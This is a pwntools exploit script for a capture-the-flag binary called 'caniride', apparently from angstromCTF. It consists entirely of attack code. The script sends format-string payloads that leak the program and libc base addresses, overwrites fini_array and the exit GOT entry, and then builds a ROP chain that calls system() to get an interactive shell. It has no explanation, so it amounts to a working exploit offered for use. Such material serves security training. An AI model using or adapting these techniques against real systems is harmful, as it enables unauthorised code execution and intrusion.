from pwn import *

elf = ELF("./caniride_patched")
libc = ELF("./libc.so.6")

p = elf.process()
#p = remote("challs.actf.co",31228)
context.arch = "amd64"
raw_input("DEBUG")

payload = b"%105c"
payload += b"%16$hhn"
payload += b"-%11$p"

p.sendlineafter(": ", payload)

p.sendlineafter(b"Pick your driver: ",b"-3")
p.recvuntil("Hi, this is ")
elf.address = u64(p.recvuntil(" your driver. Get in!\n",drop=True).ljust(8,b"\x00")) - 0x35a8
log.info("PIE BASE: " +hex(elf.address))

payload = p64(elf.address+0x3300) #fini_array_caller

p.sendlineafter(": ", payload)

p.recvuntil("-")
leak = p.recvuntil("!", drop=True)
print(leak)
libc.address = int(leak,16) -0x1F2A28
log.info("LIBC BASE: " +hex(libc.address))
gadget = libc.address + 0x0000000000044454
gadget = p64(gadget)
print(hex(u16(gadget[:-6])))
b = hex(u16(gadget[:-6]))
b = int(b,16) - 0x10

payload = b"A"*16
payload += ("%0{}c".format(b)).encode()
payload += b"%0012$hn"
payload += p64(elf.got['exit'])

p.sendlineafter(": ", payload)
p.sendlineafter(b"Pick your driver: ",b"-3")

pop_rdi = elf.address + 0x0000000000001503

payload += b"A"*40 
payload += p64(pop_rdi)
payload += p64(libc.address + 0x1b45bd)
payload += p64(libc.sym['system'])
p.sendlineafter(": ", payload)


p.interactive()
